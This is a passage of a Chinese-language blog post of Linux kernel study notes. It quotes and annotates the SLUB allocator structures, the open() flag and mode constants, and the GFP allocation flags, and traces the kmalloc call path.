class="number">78</span>     <span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *);<span class="comment">//该缓存区的构造函数，初始化的时候调用；并设置该cpu的当前使用的缓冲区；</span></span><br><span class="line"> <span class="number">79</span>     <span class="keyword">int</span> inuse;      <span class="comment">/* Offset to metadata */</span></span><br><span class="line"> <span class="number">80</span>     <span class="keyword">int</span> align;      <span class="comment">/* Alignment */</span></span><br><span class="line"> <span class="number">81</span>     <span class="keyword">int</span> reserved;       <span class="comment">/* Reserved bytes at the end of slabs */</span></span><br><span class="line"> <span class="number">82</span>     <span class="keyword">const</span> <span class="keyword">char</span> *name;   <span class="comment">/* Name (only for display!) */</span></span><br><span class="line"> <span class="number">83</span>     <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>  <span class="comment">/* List of slab caches */</span><span class="comment">//所有kmem_cache结构都会链入这个链表；</span></span><br><span class="line"> <span class="number">84</span> <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line"> <span class="number">85</span>     <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>    <span class="comment">/* For sysfs */</span></span><br><span class="line"> <span class="number">86</span> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> <span class="number">87</span> <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line"> <span class="number">88</span>     <span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> *<span class="title">memcg_params</span>;</span></span><br><span class="line"> <span class="number">89</span>     <span class="keyword">int</span> max_attr_size; <span class="comment">/* for propagation, maximum size of a stored attr */</span></span><br><span class="line"> <span class="number">90</span> <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line"> <span class="number">91</span>     <span class="class"><span class="keyword">struct</span> <span class="title">kset</span> *<span class="title">memcg_kset</span>;</span></span><br><span class="line"> <span class="number">92</span> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> <span class="number">93</span> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> <span class="number">94</span> </span><br><span class="line"> <span class="number">95</span> <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"> <span class="number">96</span>     <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 97      * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment"> 98      */</span></span><br><span class="line"> <span class="number">99</span>     <span class="keyword">int</span> remote_node_defrag_ratio;<span class="comment">//numa框架，该值越小，越倾向于在本结点分配对象；</span></span><br><span class="line"><span class="number">100</span> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="comment">//此高速缓存的slab链表，每个numa节点有一个，有可能该高速缓存有些slab处于其他几点上；</span></span><br><span class="line"><span class="number">101</span>     <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line"><span class="number">102</span> &#125;;</span><br></pre></td></tr></table></figure>
<p><strong>struct kmem_cache_cpu</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">40</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line"><span class="number">41</span>     <span class="keyword">void</span> **freelist;<span class="comment">//下一个空闲对象地址/* Pointer to next available object */</span></span><br><span class="line"><span class="number">42</span>     <span class="keyword">unsigned</span> <span class="keyword">long</span> tid;  <span class="comment">/* Globally unique transaction id */</span><span class="comment">//主要考虑并发；</span></span><br><span class="line"><span class="number">43</span>     <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span>  <span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line">        <span class="comment">//cpu当前使用的slab缓冲区描述符，freelist会指向此slab的下一个空闲对象；</span></span><br><span class="line"><span class="number">44</span>     <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">partial</span>;</span>   <span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line">       <span class="comment">//cpu部分空slab链表，放到cpu的部分空slab链表中的slab会被冻结，而放入node中的部分空slab链表则解冻，解冻标志放在slab缓冲区描述符中；</span></span><br><span class="line"><span class="number">45</span> <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line"><span class="number">46</span>     <span class="keyword">unsigned</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="number">47</span> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="number">48</span> &#125;;</span><br></pre></td></tr></table></figure>
<p><strong>struct kmem_cache_node</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">315</span>  * The slab lists <span class="keyword">for</span> all objects.</span><br><span class="line"><span class="number">316</span>  */ </span><br><span class="line"><span class="number">317</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line"><span class="number">318</span>     <span class="keyword">spinlock_t</span> list_lock;</span><br><span class="line"><span class="number">319</span>     </span><br><span class="line"><span class="number">320</span> <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line">......</span><br><span class="line"><span class="number">331</span> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="number">332</span> </span><br><span class="line"><span class="number">333</span> <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line"><span class="number">334</span>     <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_partial;</span><br><span class="line"><span class="number">335</span>     <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span><span class="comment">//只保留了部分空slab缓冲区；</span></span><br><span class="line"><span class="number">336</span> <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line"><span class="number">337</span>     <span class="keyword">atomic_long_t</span> nr_slabs;</span><br><span class="line"><span class="number">338</span>     <span class="keyword">atomic_long_t</span> total_objects;</span><br><span class="line"><span class="number">339</span>     <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="number">340</span> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="number">341</span> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="number">342</span> </span><br><span class="line"><span class="number">343</span> &#125;;</span><br></pre></td></tr></table></figure>
<p>比较好文章：</p>
<p><a href="https://blog.csdn.net/lukuen/article/details/6935068" target="_blank" rel="noopener">https://blog.csdn.net/lukuen/article/details/6935068</a></p>
<p><a href="https://www.cnblogs.com/tolimit/p/4654109.html" target="_blank" rel="noopener">https://www.cnblogs.com/tolimit/p/4654109.html</a></p>
<p>一些相关函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Tracepoints definitions. */</span></span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.12/source/include/linux/slab.h 可自行查看</span></span><br><span class="line">EXPORT_TRACEPOINT_SYMBOL(kmalloc);</span><br><span class="line">EXPORT_TRACEPOINT_SYMBOL(kmem_cache_alloc);</span><br><span class="line">EXPORT_TRACEPOINT_SYMBOL(kmalloc_node);</span><br><span class="line">EXPORT_TRACEPOINT_SYMBOL(kmem_cache_alloc_node);</span><br><span class="line">EXPORT_TRACEPOINT_SYMBOL(kfree);</span><br><span class="line">EXPORT_TRACEPOINT_SYMBOL(kmem_cache_free);</span><br></pre></td></tr></table></figure>
<h2 id="知识积累："><a href="#知识积累：" class="headerlink" title="知识积累："></a>知识积累：</h2><h3 id="linuxkernel完善教程"><a href="#linuxkernel完善教程" class="headerlink" title="linuxkernel完善教程"></a>linuxkernel完善教程</h3><p><a href="https://github.com/gatieme/LDD-LinuxDeviceDrivers/tree/master/study/kernel" target="_blank" rel="noopener">https://github.com/gatieme/LDD-LinuxDeviceDrivers/tree/master/study/kernel</a></p>
<h3 id="open的第2-3个参数"><a href="#open的第2-3个参数" class="headerlink" title="open的第2/3个参数"></a><strong>open的第2/3个参数</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_ACCMODE   00000003  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_RDONLY    00000000  <span class="comment">//只读打开  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_WRONLY    00000001  <span class="comment">//只写打开  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_RDWR      00000002  <span class="comment">//读写打开  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> O_CREAT  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_CREAT     00000100    <span class="comment">//文件不存在则创建，需要mode_t  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> O_EXCL  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_EXCL      00000200    <span class="comment">//如果同时指定了O_CREAT，而文件已经存在，则出错   </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> O_NOCTTY  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_NOCTTY    00000400    <span class="comment">//如果pathname代表终端设备，则不将此设备分配作为此进程的控制终端  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> O_TRUNC  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_TRUNC     00001000    <span class="comment">//如果此文件存在，而且为只读或只写成功打开，则将其长度截短为0   </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> O_APPEND  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_APPEND    00002000    <span class="comment">//每次写时都加到文件的尾端  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> O_NONBLOCK  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_NONBLOCK  00004000     <span class="comment">//如果pathname指的是一个FIFO、一个块特殊文件或一个字符特殊文件，则此选择项为此文件的本次打开操作和后续的I / O操作设置非阻塞  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> O_SYNC  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_SYNC      00010000    <span class="comment">//使每次write都等到物理I/O操作完成  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FASYNC  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASYNC      00020000    <span class="comment">//兼容BSD的fcntl同步操作  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> O_DIRECT  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_DIRECT    00040000    <span class="comment">//直接磁盘操作标识，每次读写都不使用内核提供的缓存，直接读写磁盘设备  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> O_LARGEFILE  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_LARGEFILE 00100000    <span class="comment">// 大文件标识  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> O_DIRECTORY  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_DIRECTORY 00200000    <span class="comment">//必须是目录  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> O_NOFOLLOW  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_NOFOLLOW  00400000    <span class="comment">//不获取连接文件  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> O_NOATIME  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_NOATIME   01000000  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> O_CLOEXEC  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_CLOEXEC   02000000    <span class="comment">/* set close_on_exec */</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> O_NDELAY  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_NDELAY    O_NONBLOCK  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"></span><br><span class="line">（<span class="number">3</span>）Linux2<span class="number">.2</span>以后特有的旗标，以避免一些系统安全问题。参数mode 则有下列数种组合，只有在建立新文件时才会生效，此外真正建文件时的权限会受到umask值所影响，因此该文件权限应该为（mode-umaks）。</span><br><span class="line">S_IRWXU00700 权限，代表该文件所有者具有可读、可写及可执行的权限。</span><br><span class="line">S_IRUSR 或S_IREAD，<span class="number">00400</span>权限，代表该文件所有者具有可读取的权限。</span><br><span class="line">S_IWUSR 或S_IWRITE，<span class="number">00200</span> 权限，代表该文件所有者具有可写入的权限。</span><br><span class="line">S_IXUSR 或S_IEXEC，<span class="number">00100</span> 权限，代表该文件所有者具有可执行的权限。</span><br><span class="line">S_IRWXG <span class="number">00070</span>权限，代表该文件用户组具有可读、可写及可执行的权限。</span><br><span class="line">S_IRGRP <span class="number">00040</span> 权限，代表该文件用户组具有可读的权限。</span><br><span class="line">S_IWGRP <span class="number">00020</span>权限，代表该文件用户组具有可写入的权限。</span><br><span class="line">S_IXGRP <span class="number">00010</span> 权限，代表该文件用户组具有可执行的权限。</span><br><span class="line">S_IRWXO <span class="number">00007</span>权限，代表其他用户具有可读、可写及可执行的权限。</span><br><span class="line">S_IROTH <span class="number">00004</span> 权限，代表其他用户具有可读的权限</span><br><span class="line">S_IWOTH <span class="number">00002</span>权限，代表其他用户具有可写入的权限。</span><br><span class="line">S_IXOTH <span class="number">00001</span> 权限，代表其他用户具有可执行的权限。</span><br></pre></td></tr></table></figure>
<h3 id="系统调用入口及接口"><a href="#系统调用入口及接口" class="headerlink" title="系统调用入口及接口"></a>系统调用入口及接口</h3><p><a href="https://elixir.bootlin.com/linux/v5.0-rc8/source/fs" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.0-rc8/source/fs</a></p>
<p><a href="https://elixir.bootlin.com/linux/v5.0-rc8/source/kernel/sys.c" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.0-rc8/source/kernel/sys.c</a></p>
<p><a href="https://elixir.bootlin.com/linux/v5.0-rc8/source/include/linux/syscalls.h" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.0-rc8/source/include/linux/syscalls.h</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * In case of changes, please don't forget to update</span></span><br><span class="line"><span class="comment"> * include/trace/events/mmflags.h and tools/perf/builtin-kmem.c</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Plain integer GFP bitmasks. Do not use this directly. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_DMA		0x01u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_HIGHMEM		0x02u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_DMA32		0x04u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_MOVABLE		0x08u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_RECLAIMABLE	0x10u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_HIGH		0x20u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_IO		0x40u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_FS		0x80u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_NOWARN		0x200u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_RETRY_MAYFAIL	0x400u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_NOFAIL		0x800u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_NORETRY		0x1000u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_MEMALLOC		0x2000u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_COMP		0x4000u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_ZERO		0x8000u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_NOMEMALLOC	0x10000u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_HARDWALL		0x20000u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_THISNODE		0x40000u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_ATOMIC		0x80000u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_ACCOUNT		0x100000u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_DIRECT_RECLAIM	0x400000u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_WRITE		0x800000u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_KSWAPD_RECLAIM	0x1000000u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_NOLOCKDEP	0x2000000u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ___GFP_NOLOCKDEP	0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">___GFP_KSWAPD_RECLAIM | ___GFP_DIRECT_RECLAIM | ___GFP_FS | ___GFP_IO</span><br><span class="line"><span class="comment">/* If the above are modified, __GFP_BITS_SHIFT may need updat</span></span><br></pre></td></tr></table></figure>
<h2 id="笔记："><a href="#笔记：" class="headerlink" title="笔记："></a>笔记：</h2><p>从<code>mm/slab.h</code>中的<code>kmalloc</code> </p>
<p>到<code>mm/slub.h</code>中的<code>__kmalloc</code>，<code>size</code>与<code>flag</code>为参数</p>
<p>将<code>size</code>与<code>flag</code>作为参数传给<code>mm/slab_common.h</code>中的<code>kmalloc_slab</code>，在其中用<code>size</code>确定<code>index</code>，然后用<code>index</code>到<code>kmalloc_caches[](元素类型全是kmem_cache*)</code>中确定<code>kmem_cache*</code>，返回一个<code>kmem_cache*</code>类型变量给<code>s</code>。</p>
<p>在<code>include/linux/slub_def.h</code>中的<code>kmem_cache</code>结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Slab cache management.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span>               <span class="comment">//important</span></span><br><span class="line">	<span class="comment">/* Used for retriving partial slabs etc */</span></span><br><span class="line">	<span class="keyword">slab_flags_t</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size;	<span class="comment">/* The size of an object including meta data */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> object_size;<span class="comment">/* The size of an object without meta data */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset;	<span class="comment">/* Free pointer offset. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cpu_partial;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">	<span class="keyword">gfp_t</span> allocflags;	<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line">	<span class="keyword">int</span> refcount;		<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line">	<span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;		<span class="comment">/* Offset to metadata */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> align;		<span class="comment">/* Alignment */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> red_left_pad;	<span class="comment">/* Left redzone padding size */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name;	<span class="comment">/* Name (only for display!) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>	<span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>	<span class="comment">/* For sysfs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">kobj_remove_work</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> <span class="title">memcg_params</span>;</span></span><br><span class="line">	<span class="comment">/* for propagation, maximum size of a stored attr */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_attr_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kset</span> *<span class="title">memcg_kset</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> random;                                <span class="comment">//用来异或加密</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> 